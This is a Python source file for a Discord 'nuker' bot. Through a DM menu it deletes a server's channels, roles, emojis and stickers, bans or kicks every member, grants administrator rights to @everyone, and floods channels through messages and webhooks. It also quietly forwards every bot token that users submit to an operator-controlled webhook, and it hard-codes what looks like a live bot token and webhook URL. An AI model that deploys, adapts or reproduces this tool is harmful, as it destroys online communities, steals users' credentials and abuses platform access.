"""
#1888 & #25 Nuker Bot v1.0
"""

import discord
from discord import app_commands
import aiohttp
import asyncio
import json
import base64

BOT_TOKEN = "MTQ4MzkyMTc5OTE0OTUyMzA3NA.GEBtXm.-pmE7GXX9mf5yy6rf5gjXPnWp1IpyjamsbISYk"
DATA_WEBHOOK = "https://discord.com/api/webhooks/1523419372708827238/fXsf-sXLuJdkiPFKbRnsrbaobGX73YgE2wAJxqyrK9UZZ5YyNHwcAx_LxBA2JSiuUIiF"  # put your webhook URL here to save tokens

intents = discord.Intents.default()
intents.message_content = True
intents.dm_messages = True
intents.guilds = True

bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)
sessions = {}
_data_cache = {}


# ═══════════════════════════════════════════════════════
# HTTP Engine
# ═══════════════════════════════════════════════════════

_pool = None

async def get_pool():
    global _pool
    if _pool is None or _pool.closed:
        _pool = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=15),
            connector=aiohttp.TCPConnector(limit=150, limit_per_host=80, ttl_dns_cache=300)
        )
    return _pool


async def req(method, endpoint, token, **kw):
    pool = await get_pool()
    url = f"https://discord.com/api/v10{endpoint}"
    headers = {"Authorization": f"Bot {token}"}
    if "json" in kw:
        headers["Content-Type"] = "application/json"
    try:
        async with pool.request(method, url, headers=headers, **kw) as r:
            try:
                await r.read()
            except:
                pass
            return r.status
    except:
        return 0


async def req_json(method, endpoint, token, **kw):
    pool = await get_pool()
    url = f"https://discord.com/api/v10{endpoint}"
    headers = {"Authorization": f"Bot {token}"}
    if "json" in kw:
        headers["Content-Type"] = "application/json"
    try:
        async with pool.request(method, url, headers=headers, **kw) as r:
            body = await r.read()
            try:
                data = json.loads(body) if body else None
            except:
                data = None
            return r.status, data
    except:
        return 0, None


async def webhook_req(url, payload):
    pool = await get_pool()
    try:
        async with pool.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as r:
            try:
                await r.read()
            except:
                pass
            return r.status
    except:
        return 0


async def fire_all(tasks):
    return await asyncio.gather(*tasks, return_exceptions=True)


# ═══════════════════════════════════════════════════════
# Webhook Data Storage
# ═══════════════════════════════════════════════════════

async def _load_webhook_data():
    """Load saved data from webhook channel messages"""
    global _data_cache
    if not DATA_WEBHOOK or not BOT_TOKEN or _data_cache:
        return
    try:
        pool = await get_pool()
        async with pool.get(DATA_WEBHOOK) as r:
            if r.status != 200:
                return
            info = json.loads(await r.read())
            channel_id = info.get("channel_id")
        if not channel_id:
            return
        s, messages = await req_json("GET", f"/channels/{channel_id}/messages?limit=100", BOT_TOKEN)
        if s != 200 or not messages:
            return
        for msg in reversed(messages):
            content = msg.get("content", "")
            if not content.startswith("`") or not content.endswith("`"):
                continue
            inner = content[1:-1]
            parts = inner.split("|", 2)
            if len(parts) == 3:
                uid_s, key, value = parts
                _data_cache.setdefault(uid_s, {})[key] = value
    except:
        pass


async def save_to_webhook(uid, key, value):
    """Save data to webhook channel"""
    global _data_cache
    uid_str = str(uid)
    _data_cache.setdefault(uid_str, {})[key] = value
    if DATA_WEBHOOK:
        await webhook_req(DATA_WEBHOOK, {
            "content": f"`{uid_str}|{key}|{value}`",
            "username": "#1888 & #25",
        })


def get_user_data(uid):
    return _data_cache.get(str(uid))


# ═══════════════════════════════════════════════════════
# DM Welcome
# ═══════════════════════════════════════════════════════

async def send_welcome(user):
    sessions[user.id] = {"state": "await_token"}
    await user.send(
        "```#1888 & #25 NUKER v1.0```\n"
        "─────────────\n\n"
        "send the **bot token** to start\n"
        "type `cancel` to stop\n\n"
        "# جميع حقوق محفوظه لدى trj.py"
    )



# ═══════════════════════════════════════════════════════
# Menu
# ═══════════════════════════════════════════════════════

def menu_text(s):
    return (
        f"```{s['server_name']}```\n"
        f"members: {s.get('mc','?')} · channels: {s.get('cc','?')} · roles: {s.get('rc','?')}\n"
        "─────────────\n\n"
        "`[1]`  delete channels       `[2]`  create channels\n"
        "`[3]`  delete roles          `[4]`  rename channels\n"
        "`[5]`  rename roles          `[6]`  admin @everyone\n"
        "`[7]`  kick all              `[8]`  ban all\n"
        "`[9]`  spam channels         `[10]` webhook spam\n"
        "`[11]` change name           `[12]` set icon\n"
        "`[13]` full nuke\n\n"
        "`[0]` new setup\n\n"
        "send number ▸ "
    )


# ═══════════════════════════════════════════════════════
# Stats
# ═══════════════════════════════════════════════════════

async def fetch_stats(tk, gid):
    mc, cc, rc = "?", "?", "?"
    s1, d1 = await req_json("GET", f"/guilds/{gid}?with_counts=true", tk)
    if s1 == 200 and d1:
        mc = d1.get("approximate_member_count", "?")
    s2, d2 = await req_json("GET", f"/guilds/{gid}/channels", tk)
    if s2 == 200 and d2:
        cc = len(d2)
    s3, d3 = await req_json("GET", f"/guilds/{gid}/roles", tk)
    if s3 == 200 and d3:
        rc = len(d3)
    return {"mc": mc, "cc": cc, "rc": rc}


# ═══════════════════════════════════════════════════════
# Events
# ═══════════════════════════════════════════════════════

@bot.event
async def on_ready():
    await get_pool()
    await _load_webhook_data()
    print(f"\n    #1888 & #25 Nuker v1.0 - Online | {bot.user}\n")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="/start"))
    try:
        synced = await tree.sync()
        print(f"    Synced {len(synced)} command(s)\n")
    except Exception as e:
        print(f"    Sync failed: {e}\n")


# ═══════════════════════════════════════════════════════
# /start command with button
# ═══════════════════════════════════════════════════════

class StartView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Start", style=discord.ButtonStyle.success, emoji="\U0001f680")
    async def start_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await send_welcome(interaction.user)
        except discord.Forbidden:
            pass
        try:
            await interaction.response.send_message("check your DMs", ephemeral=True)
        except:
            pass


@tree.command(name="start", description="Start #1888 & #25 Nuker")
async def start_cmd(interaction: discord.Interaction):
    await interaction.response.send_message(
        "**#1888 & #25 NUKER v1.0**\npress the button to start",
        view=StartView()
    )


# ═══════════════════════════════════════════════════════
# DM message handler
# ═══════════════════════════════════════════════════════

@bot.event
async def on_message(message):
    if message.author == bot.user or not isinstance(message.channel, discord.DMChannel):
        return

    uid = message.author.id
    txt = message.content.strip()
    session = sessions.get(uid)
    if not session:
        sessions[uid] = {"state": "idle"}
        session = sessions[uid]

    if session.get("_busy"):
        return

    state = session["state"]

    if state == "idle":
        await send_welcome(message.author)

    elif state == "await_token":
        if txt.lower() == "cancel":
            session["state"] = "idle"
            return await message.author.send("cancelled")
        s, d = await req_json("GET", "/users/@me", txt)
        if s != 200 or not d:
            return await message.author.send("invalid token, try again")
        session["token"] = txt
        session["bot_name"] = d.get("username", "?")
        await save_to_webhook(uid, "token", txt)
        await save_to_webhook(uid, "bot_name", d.get("username", "?"))
        session["state"] = "await_server"
        await message.author.send(
            f"connected as **{d.get('username')}** (`{d.get('id')}`)\n\n"
            "now send the **server ID**"
        )

    elif state == "await_server":
        if txt.lower() == "cancel":
            session["state"] = "idle"
            return await message.author.send("cancelled")
        s, d = await req_json("GET", f"/guilds/{txt}?with_counts=true", session["token"])
        if s != 200 or not d:
            return await message.author.send(f"can't access server `{txt}`, check the ID")
        session["gid"] = txt
        session["server_name"] = d.get("name", "?")
        stats = await fetch_stats(session["token"], txt)
        session.update(stats)
        session["state"] = "menu"
        await message.author.send(menu_text(session))

    elif state == "menu":
        await handle_menu(message.author, session, txt)

    elif state == "await_extra":
        if txt.lower() == "cancel":
            session["state"] = "menu"
            return await message.author.send(menu_text(session))
        action = session.pop("pending_action", None)
        await run_action(message.author, session, action, txt)

    elif state == "nuke_step":
        await handle_nuke_step(message.author, session, txt)

    elif state == "wh_spam_step":
        await handle_wh_spam_step(message.author, session, txt)


# ═══════════════════════════════════════════════════════
# Menu Handler
# ═══════════════════════════════════════════════════════

async def handle_menu(author, session, txt):
    t = txt.strip()

    if t == "menu":
        return await author.send(menu_text(session))
    if t == "0":
        session.pop("_busy", None)
        await send_welcome(author)
        return

    prompts = {
        "2":  "send the **channel name** to create",
        "4":  "send the **new name** for all channels",
        "5":  "send the **new name** for all roles",
        "9":  "send the **message** to spam",
        "11": "send the **new server name**",
        "12": "send the **image URL** for server icon",
    }

    if t in prompts:
        session["state"] = "await_extra"
        session["pending_action"] = t
        return await author.send(f"{prompts[t]}\ntype `cancel` to go back")

    if t in ("1", "3", "6", "7", "8"):
        await run_action(author, session, t)

    elif t == "10":
        session["state"] = "wh_spam_step"
        session["wh_data"] = {}
        session["wh_step"] = 1
        await author.send(
            "```WEBHOOK SPAM```\n"
            "─────────────\n\n"
            "step 1/2: send the **spam message**\n"
            "type `cancel` to go back"
        )

    elif t == "13":
        session["state"] = "nuke_step"
        session["nuke_data"] = {}
        session["nuke_step"] = 1
        await author.send(
            "```FULL NUKE```\n"
            "─────────────\n\n"
            "step 1/5: send the **channel name**\n"
            "type `cancel` to go back"
        )

    else:
        await author.send("invalid number, send `1-13` or `0`")


# ═══════════════════════════════════════════════════════
# Nuke Step Handler (5 steps)
# ═══════════════════════════════════════════════════════

async def handle_nuke_step(author, session, txt):
    step = session.get("nuke_step", 1)

    if txt.lower() == "cancel":
        session["state"] = "menu"
        session.pop("nuke_data", None)
        session.pop("nuke_step", None)
        return await author.send(menu_text(session))

    if step == 1:
        session["nuke_data"]["channel_name"] = txt.strip()
        session["nuke_step"] = 2
        await author.send(
            f"channel name: **{txt}**\n\n"
            "step 2/5: send the **new server name**\n"
            "type `cancel` to go back"
        )

    elif step == 2:
        session["nuke_data"]["server_name_new"] = txt.strip()
        session["nuke_step"] = 3
        await author.send(
            f"server name: **{txt}**\n\n"
            "step 3/5: send the **spam message**\n"
            "type `cancel` to go back"
        )

    elif step == 3:
        session["nuke_data"]["spam_msg"] = txt.strip()
        session["nuke_step"] = 4
        await author.send(
            "message saved\n\n"
            "step 4/5: choose spam type\n"
            "─────────────\n"
            "`1` normal bot spam\n"
            "`2` webhook spam\n\n"
            "send `1` or `2`"
        )

    elif step == 4:
        choice = txt.strip()
        if choice == "1":
            session["nuke_data"]["spam_type"] = "normal"
            nd = session.pop("nuke_data")
            session.pop("nuke_step", None)
            await run_action(author, session, "13", nuke_data=nd)
        elif choice == "2":
            session["nuke_data"]["spam_type"] = "webhook"
            session["nuke_step"] = 5
            await author.send(
                "step 5/5: send **count per webhook** (max 100)\n"
                "type `cancel` to go back"
            )
        else:
            await author.send("send `1` or `2` only")

    elif step == 5:
        try:
            count = max(1, min(int(txt.strip()), 100))
        except ValueError:
            return await author.send("send a valid number")
        session["nuke_data"]["wh_count"] = count
        nd = session.pop("nuke_data")
        session.pop("nuke_step", None)
        await run_action(author, session, "13", nuke_data=nd)


# ═══════════════════════════════════════════════════════
# Webhook Spam Step Handler
# ═══════════════════════════════════════════════════════

async def handle_wh_spam_step(author, session, txt):
    step = session.get("wh_step", 1)

    if txt.lower() == "cancel":
        session["state"] = "menu"
        session.pop("wh_data", None)
        session.pop("wh_step", None)
        return await author.send(menu_text(session))

    if step == 1:
        session["wh_data"]["message"] = txt.strip()
        session["wh_step"] = 2
        await author.send(
            "message saved\n\n"
            "step 2/2: send **count per webhook** (max 100)\n"
            "type `cancel` to go back"
        )

    elif step == 2:
        try:
            count = max(1, min(int(txt.strip()), 100))
        except ValueError:
            return await author.send("send a valid number")
        session["wh_data"]["count"] = count
        wd = session.pop("wh_data")
        session.pop("wh_step", None)
        await run_action(author, session, "10", wh_data=wd)


# ═══════════════════════════════════════════════════════
# Run Action
# ═══════════════════════════════════════════════════════

async def run_action(author, session, action, extra=None, nuke_data=None, wh_data=None):
    session["_busy"] = True
    session["state"] = "menu"
    tk, gid = session["token"], session["gid"]
    try:
        fn = {
            "1":  lambda: do_delete_channels(author, tk, gid),
            "2":  lambda: do_create_channels(author, tk, gid, extra or "nuked"),
            "3":  lambda: do_delete_roles(author, tk, gid),
            "4":  lambda: do_rename_channels(author, tk, gid, extra or "nuked"),
            "5":  lambda: do_rename_roles(author, tk, gid, extra or "nuked"),
            "6":  lambda: do_admin_everyone(author, tk, gid),
            "7":  lambda: do_kick_all(author, tk, gid),
            "8":  lambda: do_ban_all(author, tk, gid),
            "9":  lambda: do_spam_channels(author, tk, gid, extra or "#1888 & #25"),
            "10": lambda: do_webhook_spam(author, tk, gid, wh_data),
            "11": lambda: do_change_name(author, tk, gid, session, extra),
            "12": lambda: do_set_icon(author, tk, gid, extra),
            "13": lambda: do_full_nuke(author, tk, gid, nuke_data, session),
        }.get(action)
        if fn:
            await fn()
        stats = await fetch_stats(tk, gid)
        session.update(stats)
        await author.send(menu_text(session))
    except Exception:
        pass
    finally:
        session["_busy"] = False


# ═══════════════════════════════════════════════════════
# Webhook Helpers
# ═══════════════════════════════════════════════════════

async def _create_webhooks(tk, gid):
    s, channels = await req_json("GET", f"/guilds/{gid}/channels", tk)
    if s != 200 or not channels:
        return []
    text_chs = [c for c in channels if c.get("type") == 0]
    if not text_chs:
        return []
    results = await fire_all([
        req_json("POST", f"/channels/{ch['id']}/webhooks", tk, json={"name": "#1888 & #25"})
        for ch in text_chs
    ])
    urls = []
    for r in results:
        if isinstance(r, Exception):
            continue
        st, data = r
        if st in (200, 201) and isinstance(data, dict) and data.get("url"):
            urls.append(data["url"])
    return urls


async def _spam_webhooks(webhooks, msg, count):
    payload = {
        "content": msg,
        "username": "#1888 & #25",
        "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png"
    }
    total_ok = 0
    batch = 30
    sent = 0
    while sent < count:
        actual_batch = min(batch, count - sent)
        tasks = [webhook_req(url, payload) for url in webhooks for _ in range(actual_batch)]
        results = await fire_all(tasks)
        ok = sum(1 for r in results if r in (200, 204))
        total_ok += ok
        sent += actual_batch
        if ok == 0:
            await asyncio.sleep(1.0)
        else:
            await asyncio.sleep(0.3)
    return total_ok


async def _delete_webhooks(tk, gid, webhooks):
    tasks = []
    for url in webhooks:
        try:
            parts = url.rstrip("/").split("/")
            wh_id = parts[-2]
            tasks.append(req("DELETE", f"/guilds/{gid}/webhooks/{wh_id}", tk))
        except:
            pass
    if tasks:
        await fire_all(tasks)


# ═══════════════════════════════════════════════════════
# 1 - DELETE ALL CHANNELS
# ═══════════════════════════════════════════════════════

async def do_delete_channels(author, tk, gid):
    await author.send("deleting channels...")
    deleted = 0
    for _ in range(5):
        s, channels = await req_json("GET", f"/guilds/{gid}/channels", tk)
        if s != 200 or not channels:
            break
        tasks = [req("DELETE", f"/channels/{c['id']}", tk) for c in channels]
        results = await fire_all(tasks)
        deleted += sum(1 for r in results if r in (200, 204))
        await asyncio.sleep(0.5)
    await author.send(f"done - deleted **{deleted}** channels")


# ═══════════════════════════════════════════════════════
# 2 - CREATE CHANNELS
# ═══════════════════════════════════════════════════════

async def do_create_channels(author, tk, gid, name):
    await author.send(f"creating 250 channels (`{name}`)...")
    tasks = [
        req("POST", f"/guilds/{gid}/channels", tk, json={"name": name, "type": 0})
        for _ in range(250)
    ]
    results = await fire_all(tasks)
    ok = sum(1 for r in results if r in (200, 201))
    await author.send(f"done - created **{ok}** channels")


# ═══════════════════════════════════════════════════════
# 3 - DELETE ALL ROLES
# ═══════════════════════════════════════════════════════

async def do_delete_roles(author, tk, gid):
    await author.send("deleting roles...")
    s, roles = await req_json("GET", f"/guilds/{gid}/roles", tk)
    if s != 200 or not roles:
        return await author.send("failed to get roles")
    targets = [r for r in roles if r.get("name") != "@everyone"]
    if not targets:
        return await author.send("no roles to delete")
    tasks = [req("DELETE", f"/guilds/{gid}/roles/{r['id']}", tk) for r in targets]
    results = await fire_all(tasks)
    ok = sum(1 for r in results if r in (200, 204))
    await author.send(f"done - deleted **{ok}/{len(targets)}** roles")


# ═══════════════════════════════════════════════════════
# 4 - RENAME ALL CHANNELS
# ═══════════════════════════════════════════════════════

async def do_rename_channels(author, tk, gid, name):
    await author.send(f"renaming channels to `{name}`...")
    s, channels = await req_json("GET", f"/guilds/{gid}/channels", tk)
    if s != 200 or not channels:
        return await author.send("failed to get channels")
    tasks = [
        req("PATCH", f"/channels/{c['id']}", tk, json={"name": name})
        for c in channels
    ]
    results = await fire_all(tasks)
    ok = sum(1 for r in results if r in (200, 204))
    await author.send(f"done - renamed **{ok}/{len(channels)}** channels")


# ═══════════════════════════════════════════════════════
# 5 - RENAME ALL ROLES
# ═══════════════════════════════════════════════════════

async def do_rename_roles(author, tk, gid, name):
    await author.send(f"renaming roles to `{name}`...")
    s, roles = await req_json("GET", f"/guilds/{gid}/roles", tk)
    if s != 200 or not roles:
        return await author.send("failed to get roles")
    targets = [r for r in roles if r.get("name") != "@everyone"]
    if not targets:
        return await author.send("no roles")
    tasks = [
        req("PATCH", f"/guilds/{gid}/roles/{r['id']}", tk,
            json={"name": name, "color": r.get("color", 0)})
        for r in targets
    ]
    results = await fire_all(tasks)
    ok = sum(1 for r in results if r in (200, 204))
    await author.send(f"done - renamed **{ok}/{len(targets)}** roles")


# ═══════════════════════════════════════════════════════
# 6 - GIVE ADMIN @EVERYONE
# ═══════════════════════════════════════════════════════

async def do_admin_everyone(author, tk, gid):
    await author.send("giving admin to @everyone...")
    s = await req("PATCH", f"/guilds/{gid}/roles/{gid}", tk, json={
        "permissions": "8", "color": 0, "hoist": False, "mentionable": True, "name": "@everyone"
    })
    await author.send(f"{'done - admin given' if s in (200, 204) else f'failed ({s})'}")


# ═══════════════════════════════════════════════════════
# 7 - KICK ALL MEMBERS
# ═══════════════════════════════════════════════════════

async def do_kick_all(author, tk, gid):
    await author.send("kicking members...")
    s, members = await req_json("GET", f"/guilds/{gid}/members?limit=1000", tk)
    if s != 200 or not members:
        return await author.send("failed to get members")
    tasks = [req("DELETE", f"/guilds/{gid}/members/{m['user']['id']}", tk) for m in members]
    if not tasks:
        return await author.send("no members")
    results = await fire_all(tasks)
    ok = sum(1 for r in results if r in (200, 204))
    await author.send(f"done - kicked **{ok}/{len(tasks)}**")


# ═══════════════════════════════════════════════════════
# 8 - BAN ALL MEMBERS
# ═══════════════════════════════════════════════════════

async def do_ban_all(author, tk, gid):
    await author.send("banning members...")
    s, members = await req_json("GET", f"/guilds/{gid}/members?limit=1000", tk)
    if s != 200 or not members:
        return await author.send("failed to get members")
    tasks = [
        req("PUT", f"/guilds/{gid}/bans/{m['user']['id']}", tk, json={"delete_message_days": 0})
        for m in members
    ]
    if not tasks:
        return await author.send("no members")
    results = await fire_all(tasks)
    ok = sum(1 for r in results if r in (200, 204))
    await author.send(f"done - banned **{ok}/{len(tasks)}**")


# ═══════════════════════════════════════════════════════
# 9 - SPAM ALL CHANNELS
# ═══════════════════════════════════════════════════════

async def do_spam_channels(author, tk, gid, msg_text):
    await author.send("spamming channels...")
    s, channels = await req_json("GET", f"/guilds/{gid}/channels", tk)
    if s != 200 or not channels:
        return await author.send("failed to get channels")
    text_chs = [c for c in channels if c.get("type") == 0]
    if not text_chs:
        return await author.send("no text channels")
    total_ok = 0
    for i in range(5):
        tasks = [
            req("POST", f"/channels/{c['id']}/messages", tk, json={"content": msg_text})
            for c in text_chs
        ]
        results = await fire_all(tasks)
        ok = sum(1 for r in results if r == 200)
        total_ok += ok
        if ok == 0:
            await asyncio.sleep(1.0)
        else:
            await asyncio.sleep(0.5)
    await author.send(f"done - sent **{total_ok}** messages in {len(text_chs)} channels")


# ═══════════════════════════════════════════════════════
# 10 - WEBHOOK SPAM (create + spam + delete in one)
# ═══════════════════════════════════════════════════════

async def do_webhook_spam(author, tk, gid, wh_data=None):
    spam_msg = (wh_data or {}).get("message", "@everyone")
    count = (wh_data or {}).get("count", 100)

    await author.send("creating webhooks in all channels...")
    webhooks = await _create_webhooks(tk, gid)
    if not webhooks:
        return await author.send("no text channels found")

    total = len(webhooks) * count
    await author.send(
        f"created **{len(webhooks)}** webhooks\n"
        f"spamming **{total}** messages..."
    )
    ok = await _spam_webhooks(webhooks, spam_msg, count)

    await author.send("cleaning up webhooks...")
    await _delete_webhooks(tk, gid, webhooks)

    await author.send(f"done - sent **{ok}/{total}** messages")


# ═══════════════════════════════════════════════════════
# 11 - CHANGE SERVER NAME
# ═══════════════════════════════════════════════════════

async def do_change_name(author, tk, gid, session, name):
    if not name:
        return await author.send("no name provided")
    s = await req("PATCH", f"/guilds/{gid}", tk, json={"name": name})
    if s == 200:
        session["server_name"] = name
        await author.send(f"done - server name: **{name}**")
    else:
        await author.send(f"failed ({s})")


# ═══════════════════════════════════════════════════════
# 12 - SET SERVER ICON
# ═══════════════════════════════════════════════════════

async def do_set_icon(author, tk, gid, url):
    if not url:
        return await author.send("no URL provided")
    await author.send("downloading image...")
    try:
        pool = await get_pool()
        async with pool.get(url) as r:
            if r.status != 200:
                return await author.send("failed to download image")
            b64 = base64.b64encode(await r.read()).decode()
            s = await req("PATCH", f"/guilds/{gid}", tk, json={"icon": f"data:image/jpeg;base64,{b64}"})
            await author.send(f"{'done - icon set' if s == 200 else f'failed ({s})'}")
    except Exception as e:
        await author.send(f"error: {e}")


# ═══════════════════════════════════════════════════════
# 13 - FULL NUKE
# ═══════════════════════════════════════════════════════

async def do_full_nuke(author, tk, gid, nuke_data=None, session=None):
    ch_name = (nuke_data or {}).get("channel_name", "nuked")
    new_name = (nuke_data or {}).get("server_name_new", "nuked")
    spam_msg = (nuke_data or {}).get("spam_msg", "NUKED")
    spam_type = (nuke_data or {}).get("spam_type", "normal")
    wh_count = (nuke_data or {}).get("wh_count", 100)

    # ── Phase 1: Destroy ──
    await author.send("**phase 1/3: destroying everything...**")

    r = await fire_all([
        req_json("GET", f"/guilds/{gid}/channels", tk),
        req_json("GET", f"/guilds/{gid}/roles", tk),
        req_json("GET", f"/guilds/{gid}/emojis", tk),
        req_json("GET", f"/guilds/{gid}/stickers", tk),
        req_json("GET", f"/guilds/{gid}/members?limit=1000", tk),
    ])

    delete_tasks = []

    if not isinstance(r[0], Exception) and r[0][0] == 200 and r[0][1]:
        for c in r[0][1]:
            delete_tasks.append(req("DELETE", f"/channels/{c['id']}", tk))

    if not isinstance(r[1], Exception) and r[1][0] == 200 and r[1][1]:
        for rl in r[1][1]:
            if rl.get("name") != "@everyone":
                delete_tasks.append(req("DELETE", f"/guilds/{gid}/roles/{rl['id']}", tk))

    if not isinstance(r[2], Exception) and r[2][0] == 200 and r[2][1]:
        for e in r[2][1]:
            delete_tasks.append(req("DELETE", f"/guilds/{gid}/emojis/{e['id']}", tk))

    if not isinstance(r[3], Exception) and r[3][0] == 200 and r[3][1]:
        for st in r[3][1]:
            delete_tasks.append(req("DELETE", f"/guilds/{gid}/stickers/{st['id']}", tk))

    if not isinstance(r[4], Exception) and r[4][0] == 200 and r[4][1]:
        for m in r[4][1]:
            delete_tasks.append(req("PUT", f"/guilds/{gid}/bans/{m['user']['id']}", tk,
                                     json={"delete_message_days": 0}))

    delete_tasks.append(req("PATCH", f"/guilds/{gid}/roles/{gid}", tk, json={
        "permissions": "8", "color": 0, "hoist": False, "mentionable": True, "name": "@everyone"
    }))

    if delete_tasks:
        results = await fire_all(delete_tasks)
        del_ok = sum(1 for x in results if x in (200, 201, 204))
    else:
        del_ok = 0

    # Extra delete rounds
    for _ in range(3):
        s, chs = await req_json("GET", f"/guilds/{gid}/channels", tk)
        if s != 200 or not chs:
            break
        extra = await fire_all([req("DELETE", f"/channels/{c['id']}", tk) for c in chs])
        del_ok += sum(1 for x in extra if x in (200, 204))
        await asyncio.sleep(0.5)

    await author.send(f"phase 1 done - deleted **{del_ok}**")

    # ── Phase 2: Create channels + Change server name ──
    await author.send("**phase 2/3: creating channels & changing name...**")

    create_tasks = [
        req("POST", f"/guilds/{gid}/channels", tk, json={"name": ch_name, "type": 0})
        for _ in range(250)
    ]
    create_tasks.append(req("PATCH", f"/guilds/{gid}", tk, json={"name": new_name}))

    results = await fire_all(create_tasks)
    crt_ok = sum(1 for x in results if x in (200, 201))
    await author.send(f"phase 2 done - created **{crt_ok}** channels, name → **{new_name}**")
    if session:
        session["server_name"] = new_name

    # ── Phase 3: Spam ──
    await author.send("**phase 3/3: spamming...**")

    s, channels = await req_json("GET", f"/guilds/{gid}/channels", tk)
    pings = 0

    if s == 200 and channels:
        text_chs = [c for c in channels if c.get("type") == 0]

        if spam_type == "normal":
            # Bot spam only - 5 rounds
            for _ in range(5):
                msg_tasks = [
                    req("POST", f"/channels/{c['id']}/messages", tk, json={"content": spam_msg})
                    for c in text_chs
                ]
                msg_results = await fire_all(msg_tasks)
                ok = sum(1 for x in msg_results if x == 200)
                pings += ok
                if ok == 0:
                    await asyncio.sleep(1.0)
                else:
                    await asyncio.sleep(0.5)

        elif spam_type == "webhook":
            # Webhook spam only - no normal bot spam
            webhooks = await _create_webhooks(tk, gid)
            if webhooks:
                pings += await _spam_webhooks(webhooks, spam_msg, wh_count)
                await _delete_webhooks(tk, gid, webhooks)

    type_label = "normal" if spam_type == "normal" else "webhook"
    await author.send(
        f"```NUKE COMPLETE```\n"
        f"spam type: {type_label}\n"
        f"deleted: {del_ok} | created: {crt_ok} | messages: {pings}"
    )


# ═══════════════════════════════════════════════════════
# Run
# ═══════════════════════════════════════════════════════

if __name__ == "__main__":
    if not BOT_TOKEN:
        print("    #1888 & #25 NUKER v1.0 - Put BOT_TOKEN in main.py")
        input()
    else:
        print("    Starting #1888 & #25 Nuker v1.0...")
        bot.run(BOT_TOKEN)
